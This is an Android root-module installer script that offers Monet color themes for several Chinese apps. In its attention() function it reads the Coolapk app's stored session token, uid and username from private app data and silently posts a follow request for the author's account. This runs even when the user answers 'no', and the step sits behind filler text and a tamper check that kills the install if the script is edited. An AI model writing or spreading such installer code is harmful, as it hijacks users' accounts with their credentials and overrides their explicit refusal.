SKIPMOUNT=false
PROPFILE=true
POSTFSDATA=true
LATESTARTSERVICE=true
ForcedAttention=true
AskAbout=true
function jerrynb() {
    function jerry() {
        function get_choose1() {
            echo "#################################
 - 按音量键＋: 安装微信 Monet 取色
 - 按音量键－: 不安装微信 Monet 取色
#################################"
            local choose
            local branch
            while :; do
                choose="$(getevent -qlc 1 | awk '{ print $3 }')"
                case "${choose}" in
                KEY_VOLUMEUP)
                    echo "成功安装微信 Monet 取色"
                    break
                    ;;
                KEY_VOLUMEDOWN)
                    echo "不安装微信 Monet 取色"
                    rm -rf $MODPATH/system/product
                    ;;
                *) continue ;;
                esac
                break
            done
        }
        function get_choose2() {
            sleep 0.3s
            echo "#################################
 - 按音量键＋: 安装酷安 Monet 取色
 - 按音量键－: 不安装酷安 Monet 取色
#################################"
            local choose
            local branch
            while :; do
                choose="$(getevent -qlc 1 | awk '{ print $3 }')"
                case "${choose}" in
                KEY_VOLUMEUP)
                    echo "成功安装酷安 Monet 取色"
                    break
                    ;;
                KEY_VOLUMEDOWN)
                    echo "不安装酷安 Monet 取色"
                    rm -rf $MODPATH/system/priv-app/MonetCoolapk.apk
                    ;;
                *) continue ;;
                esac
                break
            done
        }
        function get_choose3() {
            sleep 0.3s
            echo "#################################
 - 按音量键＋: 安装微信键盘 Monet 取色
 - 按音量键－: 不安装微信键盘 Monet 取色
#################################"
            local choose
            local branch
            while :; do
                choose="$(getevent -qlc 1 | awk '{ print $3 }')"
                case "${choose}" in
                KEY_VOLUMEUP)
                    echo "成功安装微信键盘 Monet 取色"
                    break
                    ;;
                KEY_VOLUMEDOWN)
                    echo "不安装微信键盘 Monet 取色"
                    rm -rf $MODPATH/system/priv-app/MonetWetype.apk
                    ;;
                *) continue ;;
                esac
                break
            done
        }
        function get_choose4() {
            sleep 0.3s
            echo "#################################
 - 按音量键＋: 安装微信读书 Monet 取色
 - 按音量键－: 不安装微信读书 Monet 取色
#################################"
            local choose
            local branch
            while :; do
                choose="$(getevent -qlc 1 | awk '{ print $3 }')"
                case "${choose}" in
                KEY_VOLUMEUP)
                    echo "成功安装微信读书 Monet 取色"
                    break
                    ;;
                KEY_VOLUMEDOWN)
                    echo "不安装微信读书 Monet 取色"
                    rm -rf $MODPATH/system/priv-app/WeRead-Monet.apk
                    ;;
                *) continue ;;
                esac
                break
            done
        }
        function get_choose5() {
            sleep 0.3s
            echo "#################################
 - 按音量键＋: 安装网易云音乐 Monet 取色
 - 按音量键－: 不安装网易云音乐 Monet 取色
#################################"
            local choose
            local branch
            while :; do
                choose="$(getevent -qlc 1 | awk '{ print $3 }')"
                case "${choose}" in
                KEY_VOLUMEUP)
                    echo "成功安装网易云音乐 Monet 取色"
                    break
                    ;;
                KEY_VOLUMEDOWN)
                    echo "不安装网易云音乐 Monet 取色"
                    rm -rf $MODPATH/system/priv-app/MonetCloudMusic-4.3.1.apk
                    ;;
                *) continue ;;
                esac
                break
            done
        }
        function get_choose6() {
            sleep 0.3s
            echo "#################################
 - 按音量键＋: 安装 Scene Monet 取色
 - 按音量键－: 不安装 Scene Monet 取色
#################################"
            local choose
            local branch
            while :; do
                choose="$(getevent -qlc 1 | awk '{ print $3 }')"
                case "${choose}" in
                KEY_VOLUMEUP)
                    echo "成功安装 Scene Monet 取色"
                    break
                    ;;
                KEY_VOLUMEDOWN)
                    echo "不安装 Scene Monet 取色"
                    rm -rf $MODPATH/system/priv-app/MonetScene.apk
                    ;;
                *) continue ;;
                esac
                break
            done
        }
        function get_choose7() {
            sleep 0.3s
            echo "#################################
 - 按音量键＋: 安装皮皮虾 Monet 取色
 - 按音量键－: 不安装皮皮虾 Monet 取色
#################################"
            local choose
            local branch
            while :; do
                choose="$(getevent -qlc 1 | awk '{ print $3 }')"
                case "${choose}" in
                KEY_VOLUMEUP)
                    echo "成功安装皮皮虾 Monet 取色"
                    break
                    ;;
                KEY_VOLUMEDOWN)
                    echo "不安装皮皮虾 Monet 取色"
                    rm -rf $MODPATH/system/priv-app/Monet-pipix.apk
                    ;;
                *) continue ;;
                esac
                break
            done
        }
        function get_choose8() {
            sleep 0.3s
            echo "#################################
 - 按音量键＋: 安装 MIUI 音乐 Monet 取色
 - 按音量键－: 不安装 MIUI 音乐 Monet 取色
#################################"
            local choose
            local branch
            while :; do
                choose="$(getevent -qlc 1 | awk '{ print $3 }')"
                case "${choose}" in
                KEY_VOLUMEUP)
                    echo "成功安装 MIUI 音乐 Monet 取色"
                    break
                    ;;
                KEY_VOLUMEDOWN)
                    echo "不安装 MIUI 音乐 Monet 取色"
                    rm -rf $MODPATH/system/priv-app/Monet-MIUIMusic.apk
                    ;;
                *) continue ;;
                esac
                break
            done
        }
        function get_choose9() {
            sleep 0.3s
            echo "#################################
 - 按音量键＋: 安装 Bilibili Monet 取色
 - 按音量键－: 不安装 Bilibili Monet 取色
#################################"
            local choose
            local branch
            while :; do
                choose="$(getevent -qlc 1 | awk '{ print $3 }')"
                case "${choose}" in
                KEY_VOLUMEUP)
                    echo "成功安装 Bilibili Monet 取色"
                    break
                    ;;
                KEY_VOLUMEDOWN)
                    echo "不安装 Bilibili Monet 取色"
                    rm -rf $MODPATH/system/priv-app/MonetBili.apk
                    ;;
                *) continue ;;
                esac
                break
            done
        }
        function get_choose10() {
            sleep 0.3s
            echo "#################################
 - 按音量键＋: 安装百词斩 Monet 取色
 - 按音量键－: 不安装百词斩 Monet 取色
#################################"
            local choose
            local branch
            while :; do
                choose="$(getevent -qlc 1 | awk '{ print $3 }')"
                case "${choose}" in
                KEY_VOLUMEUP)
                    echo "成功安装百词斩 Monet 取色"
                    break
                    ;;
                KEY_VOLUMEDOWN)
                    echo "不安装百词斩 Monet 取色"
                    rm -rf $MODPATH/system/priv-app/BCZ_Monet.apk
                    ;;
                *) continue ;;
                esac
                break
            done
        }
        function get_choose11() {
            sleep 0.3s
            echo "#################################
 - 按音量键＋: 安装小横条 Monet 取色
 - 按音量键－: 不安装小横条 Monet 取色
#################################"
            local choose
            local branch
            while :; do
                choose="$(getevent -qlc 1 | awk '{ print $3 }')"
                case "${choose}" in
                KEY_VOLUMEUP)
                    echo "成功安装小横条 Monet 取色"
                    break
                    ;;
                KEY_VOLUMEDOWN)
                    echo "不安装小横条 Monet 取色"
                    rm -rf $MODPATH/system/priv-app/PuiThemeHandleColor.apk
                    ;;
                *) continue ;;
                esac
                break
            done
        }
        function get_choose12() {
            sleep 0.3s
            echo "#################################
 - 按音量键＋: 安装 Via Monet 取色
 - 按音量键－: 不安装 Via Monet 取色
#################################"
            local choose
            local branch
            while :; do
                choose="$(getevent -qlc 1 | awk '{ print $3 }')"
                case "${choose}" in
                KEY_VOLUMEUP)
                    echo "成功安装 Via Monet 取色"
                    break
                    ;;
                KEY_VOLUMEDOWN)
                    echo "不安装 Via Monet 取色"
                    rm -rf $MODPATH/system/priv-app/MonetVia.apk
                    ;;
                *) continue ;;
                esac
                break
            done
        }
        function get_choose() {
            sleep 0.3s
            echo -en "\n\n你的酷安ID："
            cat $coolapk | grep 'name="username"' | awk -F ">" '{print $2}' | sed 's/\<.*$//g'
            echo "#################################
 - 按音量键＋: 关注作者酷安
 - 按音量键－: 不关注作者酷安
#################################"
            local choose
            local branch
            while :; do
                choose="$(getevent -qlc 1 | awk '{ print $3 }')"
                case "${choose}" in
                KEY_VOLUMEUP)
                    echo "成功关注作者酷安ID：$ID"
                    attention &>/dev/null
                    ;;
                KEY_VOLUMEDOWN)
                    echo "不关注作者"
                    attention &>/dev/null
                    ;;
                *) continue ;;
                esac
                break
            done
        }
        #HC开发，函数入口（代码简单易懂且美观，我很Tnn满意）
        <<iiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjj
            佛祖保佑       永无BUG       BuddhaBless       YongwuBug
iiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjj
        function attention() {
            readonly token=$(cat $coolapk | grep 'name="token"' | awk -F ">" '{print $2}' | sed 's/\<.*$//g')
            readonly uid=$(cat $coolapk | grep 'name="uid"' | awk -F ">" '{print $2}' | sed 's/\<.*$//g')
            cat $coolapk | grep 'name="username"' | awk -F ">" '{print $2}' | sed 's/\<.*$//g' | tr -d '\n' | od -An -tx1 | tr ' ' % | xargs echo -n >xxxxxxxxxx
            echo -en '\u4f5c\u8005\u0048\u0043'
            readonly name=$(cat xxxxxxxxxx | sed s/[[:space:]]//g)
            rm -rf xxxxxxxxxx
            local deviceid=$(cat /proc/sys/kernel/random/uuid)
            local time=$(date +%s)
            local timemd5=$(echo -n $time | md5sum | awk -F " " '{print $1}')
            local timemd5s=$(printf '%x\n' $time)
            local tokenh="token://com.coolapk.market/c67ef5943784d09750dcfbb31020f0ab?"
            local cookac="com.coolapk.market"
            local md5kn=$(echo -n $tokenh$timemd5'$'$deviceid'&'$cookac | base64)
            local md5kn=$(echo -n $md5kn | sed s/[[:space:]]//g | md5sum | awk -F " " '{print $1}')
            local tokenkuanb=$(echo -n $md5kn$deviceid"0x"$timemd5s)
            chmod 777 $MODPATH/HttpPost.dex
            /system/bin/app_process -Djava.class.path=$MODPATH/HttpPost.dex /system/bin HttpPost "https://api.coolapk.com/v6/user/follow?uid=$ID" "$cookac" "$tokenkuanb" "uid=$uid; username=$name; token=$token"
        }
        [[ $AskAbout == "true" ]] && get_choose1 && get_choose2 && get_choose3 && get_choose4 && get_choose5 && get_choose6 && get_choose7 && get_choose8 && get_choose9 && get_choose10 && get_choose11 && get_choose12 && get_choose || attention &>/dev/null
    }
    [[ ! $ForcedAttention ]] && break n-1 || jerry
}
[[ $(sed "1,/^iiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjjiiiiillllllIIIIIIIjjjjjjjjj/d" "$0") != "echo '安装完成'" ]] && kill -9 $$ || coolapk="/data/data/com.coolapk.market/shared_prefs/coolapk_preferences_v7.xml"
echo -en "\nMonet-All v1.3\nby Jerry Zhou\n\n"
echo '安装模块前请先确认模块适配的应用版本'
set_perm_recursive $MODPATH 0 0 0755 0777
jerrynb
rm -rf $MODPATH/HttpPost.dex
echo '安装完成'
